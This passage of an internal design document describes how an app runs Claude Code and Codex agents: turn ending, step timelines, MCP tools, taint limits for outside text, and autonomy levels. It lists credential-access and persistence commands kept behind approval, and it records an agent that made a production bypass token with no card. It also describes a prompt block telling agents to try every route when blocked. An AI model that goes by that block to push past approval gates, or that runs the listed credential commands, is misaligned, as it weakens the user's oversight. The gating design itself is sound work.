bounded (45 s), the whole pass too (150 s), a panic in one is caught, and the
gate opens however recovery ends; the worktree sweep runs after the agents.
A turn the app closed on before it took its messages (its mark names them,
and they were still in the inbox) is reported as sent again, never also as
"didn't finish · Retry"; and the "sent again" note names only what is still
queued, not messages a Stop dropped meanwhile. Stop, and the 3-hour limit, tell any agent
that delegated the turn "{name} couldn't finish: …", and a Stop tells each
agent whose request was still queued that it was stopped before it started.
A scheduled run is settled by its ticket id (it rides on the queued wake and
carries over an interrupt); stopped, or dropped by a Stop, it is recorded as
failed ("Stopped"), never as a success or left "Running". The status says
"Needs your OK" until every open card of the turn is answered (a count per
agent, per turn). Deleting an agent stops it, closes its queue (anything sent to it
meanwhile is refused and its sender told), and waits up to 3 s for its
turn to end; a write for an agent no longer registered is refused, so its
folder never comes back.

**When a Claude Code turn is over** (`agents/turn_end.rs`). `claude --print`
can send more than one `result` in a turn: resumed, it first answers what was
queued in the conversation (a "your background helpers were stopped"
notification) and then the user's message; with helpers it started (the Agent
tool runs them in the background by default) still out, it stays up and each
one that reports back starts another round with its own `result`. So a
`result` ends the turn only if nothing follows it for 15 s (an exit ends it at
once): its model streaming, a tool call or a tool's result reopens the turn
until the next `result`. While a helper it launched hasn't reported back, a
finished reply waits for it (up to 30 min of quiet; the working line says
"Waiting for the 2 helpers it started to report back") rather than stopping
the tree under it. A new message or Stop after the reply was complete just
ends that wait, and the next turn isn't told it was interrupted. Observed
2026-11-08 (Claude Code 2.1.319): the old rule (the first `result`, then 3 s
of streamed output to prove otherwise) cut three turns in a row mid-tool-call,
killed the helpers each had just started and said nothing, and each next turn
opened on another "helpers stopped" notification. A finished turn that
recorded no reply and showed no card, question or error ends on "Finished
without a reply…", with its timeline under it; helpers that stopped with a
turn (finished, stopped or interrupted) are named in a line. A resume whose
conversation is gone, retried fresh with a recap, says so.

**Damaged files and newer builds.** `agents.json` is written atomically and
again as `agents.json.bak`. It is read and written losslessly: fields this
build doesn't know (on an agent, a check-in, a rule), unknown top-level keys,
and whole entries it can't read (a newer build's) are kept and written back
untouched, so running an older build never deletes what a newer one saved.
Only a file that isn't JSON counts as damage: the backup is loaded and written
back, and the damaged file is kept as `agents.json.corrupt-<ms>`; with no
readable backup it is an error, never an empty list that would be saved over
it. A chat line of a kind this build doesn't know is skipped on read and stays
on disk, since the log is append-only. A torn last line in
`messages.jsonl` is skipped on read, and the next append starts a new line
instead of fusing into it. Opening a chat and paging back through it
(`agents_messages` with `before`/`through`) read the log from its end, only as
far back as the page needs, and apply `approvals.jsonl` to the page read. A log that can't be written: the user's own send
fails with the reason; a reply mid-turn is still shown, with one error line
(at most a minute) saying it won't survive a restart.

### What it did (`src-tauri/src/agents/work.rs`)

Under the last thing a turn says (its reply, its error, or "Stopped"; never
a note someone else wrote into the chat, and never a "started fresh"
divider), one quiet line: "Worked 6 min · 23 steps · edited 2 files". It
opens into the steps in order, each with its time into the turn and any
screenshot it produced. Every step is something observed: a tool call in the
engine's own output (Claude Code's `tool_use`, a Codex item; a call reported
twice is one step), an approval card, a preview screenshot. A turn with no
steps has no line.

- **Outcomes are observed**: a call is a request, so each step is matched to
  what came back by id (Claude Code's `tool_result` by `tool_use_id`, with
  `is_error` and the permission decision beside it; a Codex item's
  completion and its `status`). Declined reads "Asked to run rm — you
  declined", failed reads "Tried to edit App.tsx", and both are drawn
  quieter (`outcome` on the step). An approval step says the answer: "You
  allowed: Run a command" / "You declined: …". "Edited n files" counts only
  edits that came back successful.
- **Words, safe by construction**: `work::describe_tool` is the one table.
  A command goes through `agents::describe`, which reads the shell (quotes,
  redirections, here-documents, `&&`, pipes, loops, `bash -c`, wrappers)
  and names what the line is for in plain words: "Running the Cypress
  tests", "Looking up PR #248 on GitHub", "Getting the latest changes",
  "Installing packages", "Reading 3 files", "Fetching localhost:3268",
  "Looking up a PR on GitHub, 3 times". The only argument values it ever
  shows are safe and telling: a PR or issue number, a web host (a local
  one with its port), a script or file's own name, a count. Anything
  unknown falls back to the program's name ("Running ffmpeg"), never raw
  shell; `describe_tests.rs` holds the table. A line's headline is its
  weightiest command (tests, then deploys and builds, installs, what goes
  out to others, then the rest). A web page only
  its host ("Browsed acme.com"), a file only its name, someone else's MCP
  tool a verb and the service ("Searched Google Drive", "Sent from Gmail",
  "Worked in Chrome"), our own tools past-tense words ("Shared a file").
  The engine's bookkeeping (ToolSearch, Skill, BashOutput, plan-mode
  switches) is no step at all; an unknown built-in is "Used a tool". The
  working line uses the present tense ("Running npm test").
- **Then scrubbed, then clipped**: Keychain redaction, then `work::scrub`
  (blanks secret-named variables, flags and headers, `-p…`/`-a`, query and
  JSON fields such as `sig=` and `"password":`, bearer values, URL user
  info, key- and base64-shaped strings), and only then the 100-character
  limit, so a cut never leaves part of a token.
- **Screenshots** attach to the screenshot call that took them: the oldest
  one still running for that project. A screenshot no call explains (it
  came with a session's reply) is a step of its own.
- **Live**: while the turn runs, the status carries `work` (the newest 12
  steps and the counts; no file names) plus `doing`, the running call's
  working-line words. The working line (`AgentWorkingIndicator`) is one
  line, no bubble: the agent as a key (`AgentKey`: its avatar, raised in
  the site's key style, clicking down and up while it's live) in the steps'
  icon column, what it's doing with a soft shimmer while it's live, then muted
  "· 5 steps · 6:02" (the turn's time). The line is the toggle: it opens
  the steps so far under it, in the column the finished timeline uses,
  ending on the step it's on (its own words, timer and output); the newest
  step is left out only while the line is saying it (`doing` equals the
  activity), never when the line is blank. Hints, what a check found and
  the live browser card sit under the line on the words' edge; actions
  (Stop this step, Check on it, Stop, the ⋯ with Open project and **Take
  over**) are quiet text at its right end. When the turn ends the line
  gives way to "› Worked 6 min · 5 steps" in the same place, its chevron in
  the column the key held. Taking over a browser tab the agent drives
  is not built.
- **The step it's on right now** (`work::LiveCall`, `AgentLiveStep`): from
  the moment a call starts, the status's `work.current` carries its words,
  when it started (its own timer in the opened list, "5:32"), whether it's a
  known slow tool (`describe::Slow`: after a minute, a quiet "Test runs
  usually take a few minutes"), and what it has printed so far, only
  where the engine streams it (Codex's app server sends
  `item/commandExecution/outputDelta`; Claude Code's stream-json carries
  only `tool_progress` heartbeats, so its "Show output" says "Output
  appears when it finishes"). Output lines are stripped of escapes, then
  redacted and scrubbed like a label: the newest 20, sent at most once a
  second. After ten minutes, **Stop this step** (`agents_stop_step`) ends
  that command's process tree, found under the engine's pid by the start
  of its command line (`liveness::needle`); the engine sees it end and the
  turn carries on. Between calls the line says "Thinking".
- **Finished steps keep their words** and add what was observed: how long
  it took (`endedAt`, shown from 10s) and, for a test run, the counts the
  runner printed ("Ran the Cypress tests · 6m 12s · 42 passed, 3 failed";
  Jest, Vitest, Playwright, pytest, Mocha, Cypress's table, cargo). A
  command that ran 20s or more, or failed, keeps its last 20 lines
  (`output`, on the stored timeline only, never on the live status).
- **Alive or stuck** (`work/liveness.rs`): every engine line is a sign of
  life, and a sign of *progress* unless it's a heartbeat (Claude Code's
  `tool_progress`). Every 15s the running command's processes are looked
  up (`ps`, under the engine's pid); one using the CPU counts as progress
  too. Shown only on demand: clicking the step reads "Last activity 4s ago
  · using the CPU". With no progress for 3 min (6 for a slow tool),
  `work.quietSince` is set and the working line reads "No progress for 5
  min" with **Check on it** (`agents_check_on`: what the app can see now,
  in one line; the engine can't be asked mid-call without interrupting
  it, so it isn't) and **Stop**. A command whose process was seen and then
  gone (or a zombie) for 2 min while the engine never reported it back
  ends the turn with a line saying so (`HUNG_NOTE`).
- **In the lists**: a working agent's row (sidebar, What's in flight)
  says the step and how long ("Running the Cypress tests · 5m") or "No
  progress for 5 min", never "Working…". The avatar looks around while it
  works (no blink, no ring around it) and presses once, like a key, when
  the turn ends (docs/internal/avatars.md, "Motion").
- **Stored** beside the log, never in it: `turns/<message-id>.json`, sent
  again on `agents://message` when the turn ends, and applied only to the
  paged chat reads (desktop and phone), after the log's lock is released,
  with one listing of `turns/` per page. Search, summaries and the shared
  files list never read them. `messages.jsonl` stays append-only; older
  builds show no timeline.
- **Pruned**: an agent keeps the newest 500 timelines, and past its newest
  100 none older than 90 days; the replies stay, only what they did is
  forgotten. Deleting an agent removes its home and so its timelines;
  starting fresh keeps them, since the history above the divider is still
  shown.
- **Bounded**: at most 60 steps per turn (the newest; `stepCount` says how
  many there were), 30 file names.
- **Phone**: the message's `work` shows as the folded line and list under it
  (`mobile/src/components/work.tsx`). While it works the working row is the
  desk's line ("Running the tests · 8 steps · 3:00") and opens into the
  steps so far. Live
  steps go only to an app that says it shows them (`hello.features:
  ["work.live"]`); others get the status without `work`, and the overview
  never carries it (it goes out on every registry change).

## Tools agents get (`src-tauri/src/agents/mcp.rs`)

Served by the existing loopback agent bridge at `/mcp/agent`. The path names
no one: the caller is the `Authorization: Bearer` secret it sends, 256 random
bits issued for that agent and that turn (`broker::grant`) and revoked the
moment the turn ends; an unknown, missing or ended secret gets a bare 404.
The secret never touches a command line, where `ps` shows it to every local
account (`agents/reach.rs`): Claude Code reads it from a 0600 `--mcp-config`
file in a 0700 folder of ours, removed when the turn ends (verified on
2.1.318: the header is sent on every request); Codex from an environment
variable named by `bearer_token_env_var` (verified on 0.166's app-server),
which Codex's default shell-environment policy keeps out of the commands it
runs because its name contains `TOKEN`. (Until 2026-11 the URL was
`/mcp/<bridge token>/agents/<id>?turn=<n>`, inline on the command line, so
any local account could read it and call in as any agent; the preview token
those turns exposed is replaced once at the next launch.)

| Tool | Who | What |
| --- | --- | --- |
| `list_agents` | all | names, roles, busy / waiting |
| `message_agent` | all | async: records "Messaged X" here and "Message from Y" there, queues a turn for X |
| `project_*`, `session_*`, `preview_screenshot`, `git_status`, `push`, `deploy_status` | all | working on projects, below |
| `share_file` | all | hands the user a file it made: copied into its `attachments/`, posted as its own message with a file card |
| `share_result` | all | ends a piece of work on one result card: files, links, what it checked and did not verify; revisions become v2 (below, "Result cards") |
| `request_login` | all | a login card: connect an app or account (Gmail, Slack, LinkedIn, GitHub…) on this Mac, never a password (below, "Logins") |
| `request_secret` | all | a secure input card for an API key made for programs; the agent gets `$VAR` and a reference, never the value (below) |
| `create_agent` | Chief | name, role, instructions, optional `template`, `project` and `first_task` |
| `update_agent` | Chief | name / role / instructions / project (memory kept); engine, model, effort, routines' model and mute, with no card (below, "Settings from chat") |
| `delete_agent` | Chief | puts an Allow / Deny card in the Chief's chat first |
| `create_room` | Chief | name, 2–6 members, optional lead, a one-line purpose (`agents/room_tools.rs`, below, "Rooms") |
| `add_to_room`, `remove_from_room` | Chief | change who's in a room (it keeps 2–6); a joiner gets the room's files |
| `approve` | CLI only | the permission prompt tool (below) |

**Answers come back on their own.** A `message_agent` request is a debt: the
turn that handles it owes the sender an answer. When that turn ends, whatever
it said (or "couldn't finish: …" if it failed) is delivered back to the
sender as its answer (`runner::return_results`), so delegated work always
reports back and the delegate never spends a tool call doing it. Messaging
the sender during the turn settles the debt instead (`runner::settle`). An
answer is framed differently from a request ("Billing's answer to your
request … tell the user the outcome; don't reply"), and handling it owes
nobody anything, so answers can't ping-pong. Stop drops the debt; an
interrupted turn passes it to the turn that replaces it.

**Outside text taints one turn, not the next.** A "When…" routine's items
(or a message carrying their taint) seal the turn that answers them, and a turn
that *replaces* it after an interruption. Observed: a "When…" turn finished
with the owner's "Use it" already queued, and the worker took it straight on,
OR-ing the old taint into it, so the user's own turn ran sealed and its card
said `fromOutside: true` (and so would anything the Chief relayed from it).
`take_batch` now derives the taint from the batch, carrying the previous one
only across an interruption.

**Nested hand-offs report all the way up.** Chief → Social Posts → Voice: when
Social Posts asks Voice while answering the Chief, the app notes who it asked
on behalf of (`runner::note_onward`, per asker and helper, replaced by the next
request between the two, in memory). Voice's answer then reaches a Social Posts
turn that owes the Chief, is framed "say the outcome: it goes back to Chief of
Staff automatically" instead of "tell the user", and what it says is the
Chief's answer. Each level is noted as it asks, so any depth climbs back. A
request sent with nobody waiting on it carries nothing up. (A review of real
chats found the Chief waiting 42 minutes for an answer that had been posted in
Social Posts' own chat.)

**Loops.** Agents messaging agents can ping-pong. A user message starts a chain
at hop 0; each `message_agent` from a turn at hop *n* delivers at *n+1*, and
`message_agent` refuses past hop 6. The prompts also tell agents not to send
acknowledgements to each other.

## Working on projects (`src-tauri/src/agents/sessions.rs`)

Agents work on projects the way Remote Access does: in the
project's real agent tabs (backend PTY sessions), so the user can open the
project and carry on the same conversation. It is Remote Access's toolset,
run by the same handlers in `remote_access/tools.rs`, under names that can't
be confused with agent-to-agent `message_agent`:

| Agents | Remote handler |
| --- | --- |
| `project_list` / `project_create` / `project_open` | `list_projects` / `create_project` / `open_project` |
| `session_message` (the default) / `session_start` | `message_agent` / `start_agent` |
| `session_wait` / `session_read` / `session_key` / `session_close` / `session_progress` | `wait_for_agent` / `read_agent` / `press_key` / `close_agent` / `show_progress` |
| `preview_screenshot`, `git_status`, `deploy_status` | same |
| `push` | own: a card instead of the PIN |

- **Scope:** every project in the app (agents already run as the user with
  every project as an `--add-dir`), not the remote's opt-in list.
  `project_create` doesn't share the project for remote access and doesn't
  switch the window.
- **Answers:** the shared STATUS / reply / NEXT shape, with remote tool names
  rewritten to the agent's (`sessions::rename`, whole identifiers only).
- **Chat:** each call runs inside `AGENTS_CALL` (a task-local in
  `tools.rs`), which collects what it started, the replies it saw and its
  screenshots. They become `session` lines: "Started a session in
  acme-marketing", "Sent to acme-marketing · Claude Code 1", the reply (once
  per distinct reply), and screenshots inline. "Open session" opens the
  project with that tab selected (`openAgentSession` →
  `useRemoteAgentControl`). Screenshots are written to the agent's
  attachments and never stored behind the remote's public image links.
- **Window: it never moves because of an agent.**
  - *Sessions* start in the background. `start_agent` emits
    `remote-start-agent`; `lib/backgroundSessions.ts` spawns the PTY with the
    same builder a mounted tab uses (`lib/agentSpawn.ts`: PATH, `--session-id`,
    auto-accept, `--add-dir` libraries, the prompt as argv), then the
    project's tabs adopt it: its in-memory list if this window has opened the
    project (the active tab is left alone), otherwise its saved list in
    `.shipstudio/project.json`, which opening the project restores from. The
    Terminal that mounts then finds the PTY alive (open is idempotent) and
    replays its scrollback, so the conversation is all there. Messages,
    reads, waits and key presses were always backend-only (`pty_session`).
  - *Screenshots* are taken off-screen: headless Chromium (the preview's own
    Playwright capture) against the project's running dev server, found
    through its preview proxy (`proxy::dev_server_port_for`) — so not even
    the page or width of a preview the user is looking at changes. With no
    dev server running, the answer sends the agent to `preview_start`, which
    starts one in the background (see "Running a project from chat").
  - *Closing* a session is the tab's × done in the background, the same way.
  - `project_open` is the one tool that switches the window, because the user
    asked to see the project. "Open session" on a session line does too: the
    user clicked it.
- **Safety:** unchanged shared rules. Text only to agent tabs, never shells;
  a leading `!`, a `/` command outside the allowlist and control characters
  are refused; an opening prompt can't start with `-`.
- **Push:** no PIN. `push` puts a card in the agent's chat ("Push
  acme-marketing") with the branch, origin (credentials stripped), the
  commits and what gets committed first. It has no tool call behind it, so
  no "Always allow" is offered and no rule can skip it. Allow pushes exactly
  the tree the card described (`frozen_tree` / `push_frozen`); a change in
  between pushes nothing. An unanswered card expires after 240s.
- **Questions a session asks** (`agents/decisions.rs`): when a session stops
  on something it can't answer itself (Claude Code's folder-trust dialog, a
  permission prompt in the tab, any menu or y/n `agent_state.rs` recognises),
  the app raises a card with the prompt's own text and options, and the
  agent's tool call waits on it like `approve` (240s; then the card stays live
  and an answer wakes the agent with "call session_wait"). The card goes in
  the owner's chat **and** where the work came from: up the delegation chain
  (`runner::turn_origin`) to the agent the user asked, plus the chat a window
  is showing. One request id in every chat; answering in any resolves all
  (`decisions::resolve_all`), the others turning into the quiet "Allowed ·
  Yes, I trust this folder" line. It is announced once (`record_quietly` for
  the copies) and counts as "Needs your OK" in each row, ⌘J and the badge.
  Allow / Deny (or the session's other options) send that option's keys
  (its number; for the trust dialog's unnumbered menu, arrows then Enter),
  after checking the session is still asking the same thing. Agents can't
  answer: `session_key` refuses while a question is up, and the prompts tell
  them to say "Allow it on the card above". A message refused because the
  session was asking is sent once the card is answered.
- **Folder trust:** one card per project ("Let Claude Code work in
  demo-site?"). Allow writes `projects["<real path>"].hasTrustDialogAccepted
  = true` into `~/.claude.json` (or `$CLAUDE_CONFIG_DIR/.claude.json`), keeping
  everything else, then answers the dialog in every session of that project
  showing it. Observed with Claude Code 2.1.318 in a throwaway HOME: that is
  exactly what accepting the dialog writes, keyed by the canonical path, and
  an entry with only that key (on the folder or a parent) skips the dialog.
  Nothing is trusted without the card.
- **Change cards:** a message that changed the project leaves a `changes`
  card ("Changed 1 file in demo-site", View diff), once per message.
- **Audit:** the remote's `remote_audit.jsonl`, same rules (reads skipped,
  previews only), with `actor` set to the agent's name. The Remote access
  modal's activity list leaves those out.
- **Bound agents** are still an option; sessions are the default.

### Running a project from chat (`src-tauri/src/agents/project_tools.rs`)

The user never has to open Projects: what the workspace's buttons do, an
agent does from chat, through the same Rust commands and the window's own
dev-server owner.

- `preview_start`: consent card if needed → install if `node_modules` is
  missing → start in the background → wait until it answers → screenshot
  (kept in the chat and the agent's folder, so the phone sees it) → NEXT:
  `share_result` naming the project, whose card has Preview on the Mac and
  Watch live on the phone.
- **Consent** is the dev-server consent (`dev_consent.rs`): a card in the
  agent's chat ("Run bakery's own commands?") listing the scripts and files,
  as the Preview's prompt does. Allow approves exactly the fingerprint shown
  (`approve_dev_server`); nothing installs or starts on Deny or no answer.
  The card has no tool call behind it, so it can't be always-allowed, and no
  independence level answers it.
- **Installs** (`project_install`, or inside `preview_start`) run
  `plan_package_install`'s command (scripts only once approved) on this Mac,
  then `mark_install_scripts_ran`. The output's tail goes back to the agent
  on failure; the prompt makes fixing a missing package the agent's job.
- **The dev server is the window's**: `agents://dev-server` → 
  `useAgentDevServerControl` → `lib/agentDevServer.ts`, which calls
  `startServerForProject` / `stopServer` (the Agents pane's path), then
  `start_preview_proxy` as the workspace preview would. That proxy is what
  `proxy::dev_server_port_for` finds, so screenshots, the pane and Watch live
  all see the server. The window answers on `agents_dev_server_done`
  (status, port, type, the output's tail). The window never moves.
- `preview_stop` (stop, or `restart`), `preview_logs` (status and the last
  40 lines it printed), `git_commit` (`commit_changes`), `git_branch` (list,
  switch with auto-stash, create), `pull_request` (a card saying it pushes and
  who sees it, then `create_pull_request`; refused with uncommitted changes).
- **Budget**: a call answers within 250 s (the engines cap a tool call at
  300 s). An install or cold start still going says `STATUS: installing` /
  `starting`; the install keeps running and the next call waits on it.
- **Who**: a bound agent with a live copy of the project works on the copy
  (its server, its packages) and is refused commit, branch and pull request
  there. Settings (`policy::session_refusal`) treat install, commit, branch
  and pull request as changes. A turn answering outside text can't use the
  changing ones.
- Not added: importing from GitHub, env vars, assets, snapshots/rewind,
  workflows, the iOS simulator; agents reach most of those with their own
  file and git tools.
- Not verified: a real `preview_start` in the running app (window round trip,
  install, proxy, screenshot); the parts are unit-tested.

### Where it's working (`src-tauri/src/agents/workplace.rs`)

An agent working in a codebase shows on the Projects side, whichever way it
got there: its own commands (`cd ~/Desktop/Projects/site && npm run build`,
`git -C …`, `--prefix`/`--cwd`/`--dir`), reading or editing files there, a
project tool (`project`), or its binding. Each tool call's paths are walked up
to the nearest folder with a `.git` **directory** (a `.git` file stops the
walk); the home folder and above, a projects root, the app's own data and task
copies (`.worktrees/`) never count. The folder rides on the live status as
`TurnWork.project`, while the turn runs only.

- **Registered and pinned once.** A repository the app doesn't list yet is
  registered through `ensure_external_project_registered` (its "looks like a
  project" check included) and pinned to the top of the sidebar the first time
  it is found (`found-projects.json` beside the agents), so one the user
  unpinned stays unpinned. `agents://project-found` re-reads pins and the list.
- **Desk:** under the project's sidebar row, "Acme Site · Running the build"
  (the working line's words, `atWorkText`); the row shows as working; an
  unpinned project with an agent in it appears under Active. In the open
  project, its Agents section lists agents at work there first. A line opens
  the agent's chat.
- **Phone:** the Projects tab lists the agent on that project's card with the
  same words; those projects sort first after any waiting on a decision.
- Agents' behaviour is unchanged: nothing here routes their work.

## What an agent can do (`src-tauri/src/agents/capabilities.rs`)

Turns run with `--chrome`. Each turn's `system/init` lists the session's
tools and MCP servers with their status; the runner keeps the last one on
the agent and builds one line per kind of capability (projects, the team,
Chrome, computer use, on this Mac, connectors, needs sign-in). The lines go
into the next turn's prompt ("What you can do here") and into the editor
("What <agent> can do"). Nothing is listed before the first turn.

Verified on Claude Code 2.1.318 in `--print`: Claude in Chrome loads with
`--chrome` and a tool call answered (extension connected); the user's MCP
servers load with their status; there is no computer-use server in a
headless turn, so it isn't claimed. Not verified: Chrome with the extension
disconnected (the line then says "Not connected" if Claude Code reports it
so), and a Chrome call going through an approval card in the running app.
`cargo test --lib agents::capabilities -- --ignored` repeats the headless
check.

## Lines, cards and bars (`components/agents/AgentCard.tsx`)

Everything in a conversation that isn't something someone said is one of
three surfaces, so a chat with a request, a copy to keep and an import going
at once still reads as one product:

- **Line** — one quiet centred sentence, no surface, that wraps (never cut
  with an ellipsis: the cut half is usually the reassuring part). Something
  that happened: notes, the fresh nudge, "Started fresh · memory kept", a
  usage limit, a take-over that closed by itself. At most one text action.
- **Card** (`AgentCard`) — something that wants a decision or holds a
  result: approvals, a session's question, secret requests, import consent
  and review, the change card, the result card (`share_result`; a project
  copy's change card sits inside it, without a second surface), a real
  failure. Icon (semantic — a shield,
  a lock, a folder, a download; the warning triangle only for real danger),
  title, a muted source line ("Acme Site · in demo-site"), the body, a muted
  note, then the actions **right-aligned with the single affirmative last**.
  The affirmative (Allow, Save, Keep changes, Import) is the neutral
  `strong` button, never the accent (docs/design-system.md, "Answers are
  neutral"). `danger` only for what destroys work (Discard, Delete).
  Answered, a card becomes its outcome line.
- **Bar** (`ConversationBar`, stacked by `ConversationBars`) — the state of
  this conversation until it ends, in the reading column directly above the
  composer, in a fixed order: take-over, import, other agents' requests, what the engine can't do, a
  key in the draft, dictation blocked. At most two show; the rest fold into
  "N more". A key in the draft never folds: it guards something the user is
  about to do and can't take back, so it always shows and the others fold
  around it. A bar says the state, never repeats the card's question, and
  never points at "the card". Nothing spans the pane under the header.

The **header is identity only** (badge, name, role, project chip). What an
agent is doing is said once in its sidebar row and once in the conversation
(a bar or the working line) — never a third time up there.

Another agent's request shows in a chat one way: the requests bar above the
composer ("Lead Gen needs your OK", "16 agents need your OK"), whose Review
panel opens the same cards in place. A session's question reaches every chat
its work touched; in a chat that isn't its owner's it is left out of the
conversation and offered by that bar instead.

Vocabulary, one word per idea: a **request** (answered with **Allow /
Deny**; "Needs your OK" wherever something waits on you — sidebar row, What's
in flight, the phone); **copy** only for a project copy; **conversation**,
never "session", in what people read; **Take over / Hand back** (no noun
"take-over" in copy); **Start fresh**, **Review changes**, **Preview**,
**Open in <project>**; **logins** for what an agent needs signed in; "Mac"
where the copy means this computer. No branch names, exit codes, tab
numbers, "via connector" or "(import)" in anything a person reads.

## How much agents do on their own

One choice for the whole team (`agents/independence.rs`), drawn on desk and
phone as one four-stop slider titled "How much it does on its own", "Asks a
lot" at the left end and "Just does it" at the right:

| Stop | Stored id | Its line under the slider |
| --- | --- | --- |
| **Careful** | `often` | Reads and looks around; asks before bigger changes. |
| **Steady** (the default) | `judgement` | Reads and edits; asks before running changes or anything leaving this Mac. |
| **Bold** | `go_hard` | Does local work on this Mac; asks before anything leaves it. |
| **Unleashed** | `full_send` | Sends, posts and pushes too; only stops for money, logins, deleting for good or going live. |

Under it, at every stop: "Always asks before spending money, using your
passwords, or deleting for good." The names were "Check with me often", "Use
good judgement", "Go hard" and "Full send" until the slider; the stored ids,
the protocol and the tools kept the old ids, and the Chief still reads the old
names as the same levels (`Level::parse`). Each line is held to what the level
really answers (`autoallow::allows`, `go_hard::asks`): Careful answers no
card (only `acceptEdits` file edits in its own folder or copy, and the engine's
own read tools, go through); Steady answers reads; Bold allows local work and
network reads and asks for anything leaving the Mac (pushing, sending,
publishing, deploys, network writes) and for `sudo`, deletes outside the work
folders and credentials; Unleashed asks only the floor (money, credentials,
deleting for good, pushing to production or a protected branch, publishing a
package, `sudo` and system persistence). Words and ids live once in the
protocol's `independence.ts`; the desk draws them in `IndependenceSlider.tsx`,
the phone in `mobile/src/components/IndependenceSlider.tsx` (one adjustable
control for VoiceOver; arrows, Home and End on the desk). "Go full send" or
"unleash it" to the Chief raises one settings card (`propose_settings_change`,
`independence: full_send`).
Asked once in onboarding, after the engine is ready and before the hand-off
(Skip keeps the default); kept in Settings → Agents → Independence, ⌘K "How
independent your agents are…", and the phone's Settings
(`agents.setIndependence`, audited; read from the overview's `independence`).
Saved in `agents/independence.json`.

**Each agent may have its own** (the owner: "I want some of my agents to be
super autonomous, Bold, Unleashed, and some of them not to be"). The team's
level is the default; an agent's own is kept with its settings in
`access.json` (`Overrides.independence`), and what it runs at is its own, else
the team's (`policy::chosen_level`). Every decision path reads that: the
auto-allow in `mcp::decide` and the card sweep, Bold's and Unleashed's
lists, the browser gate, "work in its own copy" at Bold, who may search a
teammate's chat, and the prompt's "How much to do on your own"
(`policy::independence_for`). A turn answering outside text is capped exactly
as before (`independence::for_turn`), whatever its own level.

- **From chat (primary).** "Make Finance careful" or "put Social
  Posts on Unleashed" to the Chief: `propose_settings_change` with that agent
  and `independence`. Raising one (above where it is, including putting it
  back on a higher team level) is one card. Lowering only, with nothing else
  changing, applies at once with a "Settings changed: …" line in the chat and
  each changed agent's (`policy_card::lowers_only`).
- **On the desk.** The agent editor's "How much it does on its own":
  "Same as team (Bold)" first, then the four levels; saved at once
  (`agents_policy_set`, which also answers open cards a raise now covers).
  The sidebar row shows a tiny label ("Unleashed", "Careful") only when
  the agent's level differs from the team's; Settings → Agents → Independence
  says "Agents set on their own: N" when any are.
- **On the phone.** The same row on the agent sheet
  (`agents.setAgentIndependence { agentId, level | "team" }`, audited; a Mac
  that doesn't serve it shows no row), the same row label on Home, and the
  count under Settings' choice. The overview carries each agent's own level as
  `independence` (absent: the team's).

**The Chief offers a change when you plainly want one** (`agents/level_hint.rs`).
A cheap check on the user's own typed messages, in any chat, for whole phrases:
tired of being asked ("just do it" as its own sentence, "stop asking me", "too
many cards") or unhappy that something went ahead ("why did you do that without
asking me?", "should've asked me"). Either leaves a hidden note for the Chief's
next turn naming the agent, its level and the direction (from another agent's
chat, a team note). The note itself tells the Chief to
offer once, in a line ("Want me to put Finance (or the team) on Unleashed?",
the card ready; or "Want Finance to check with you before that?", which applies
at once), and to drop it for the day if the user passes; nothing is added to the
Chief's system prompt for it. At most one note per agent every 24 hours (`level_hints.json`), and
none when it would be moot (already Unleashed, already Careful).

The level is one short app-owned section of every agent's system prompt,
built from code each turn (so existing and imported agents get it on their
next turn, nothing in their CLAUDE.md is touched) and fixed per level (the
prompt cache only breaks when the user changes it). Bold tells an agent to
do what it was asked without asking at each step, stopping only for money,
identity, sending or publishing as them, pushing, deleting their data or
credentials. Bold and Steady both carry the "whatever it
takes" block (`independence::RELENTLESS`): be relentless and resourceful;
when blocked, try every route (its tools, the user's files and CLIs,
connected apps, their signed-in Chrome, search, a small script, another
agent) before asking; never stop at the first error or hand back work it can
do; never end a turn silently unfinished, but finish or say exactly what's
left and the one thing it needs.

**Which cards it answers** (`agents/autoallow.rs`). `acceptEdits` still asks
for a plain `ls -la ~/SomeFolder` outside the agent's folders, so a card per
look was the norm even when the user had said "go hard". The level now also
decides local cards, in `mcp::decide`, after a one-time grant and an Always
allow rule and before a card, for Claude Code's permission prompt and Codex's
approval requests alike (both arrive as the same `Bash` / `Edit` / `Read`
calls):

| Level | Answered without a card |
|---|---|
| Careful | nothing (as before) |
| Steady | reads |
| Bold | everything except its short ask list (`agents/go_hard.rs`) |
| Unleashed | everything except the floor below (`go_hard::full_send_program`, `connector_floor`) |

**Unleashed** (the owner: "I want to be able to make it just rip"). Sending,
posting, scheduling, commenting, emailing and publishing as the user run
without a card: mail and chat CLIs, `git send-email`, `gh` issues, pull
requests, comments and reviews, network writes, preview deploys, connector
sends and posts, and every browser click but the floor's. What still asks, in
Rust: **money** (Stripe live, writes to payment APIs, connectors that pay,
buy, order or subscribe, clicks on pay/buy/checkout controls or pages),
**credentials** (secret stores, the Keychain, `security`, `sudo`, `gh auth
token`, secrets and env vars, password boxes, connectors named after secrets),
**destruction for good** (`rm -r` outside projects, agent homes and temp;
`gh repo delete`; deleting, forcing or mirroring a remote branch; "Delete
account / repository / project"), **production and protected branches**
(pushing `main`, `master`, `production`, `release`… or the remote's default
branch, a bare `git push` on one or where it can't tell, tags, `gh pr merge`,
releases, workflow runs, `vercel --prod` / promote, other production deploys,
package publishing), **settings that change what others see or how a project
is protected** (`vercel` domains, DNS, certificates, aliases, env, project,
team and Git-link changes, deployment protection and bypass secrets, and
`vercel curl` / `vercel api` writes or requests about protection, bypass,
env, domains, tokens or settings; `gh repo edit`, a new public repo, `gh api`
writes to a repo's or org's settings, webhooks, Pages, environments, members
or visibility; observed: `vercel curl` made a protection bypass token on a
production project with no card) and **system persistence** (launch agents,
shell profiles, `crontab`, `launchctl`, `defaults write`). Each send leaves
"Sent without asking — Unleashed · …" in "What it did", and the turn ends on
one chat line naming what happened ("Without asking (Unleashed): posted on
x.com 3 times, pushed branch fix/copy, created a Vercel bypass token on
<project>", `agents/full_send.rs`), read from the command or tool and its
arguments, else the command's first words; there are no Undo or Open links
yet. The exact-text switch below holds sends even here. After outside
content only raw data leaving this Mac and new packages ask
(`go_hard::moves_data_off_mac`). **Outside text never gets Unleashed**: such a
turn's prompt and browser run at "Steady" and its approvals by Go
hard's outside-text rules.

At Bold and Unleashed **every agent reads the team folder** (each agent's
home: its files, chat log, CLAUDE.md) and copies out of it into its own home or
a project without a card; `wallet.json`, `connections.json`, anything named
like a secret, and writes into another agent's home still ask.

**Bold is allow-by-default** (after the owner's report that it still asked
for nearly every step: worktrees, `npm ci`, dev servers in the background,
`pkill`, copying `.env.local` between his projects, scripts on a page). It
behaves like Claude Code's "do anything" mode and does not use the classifier
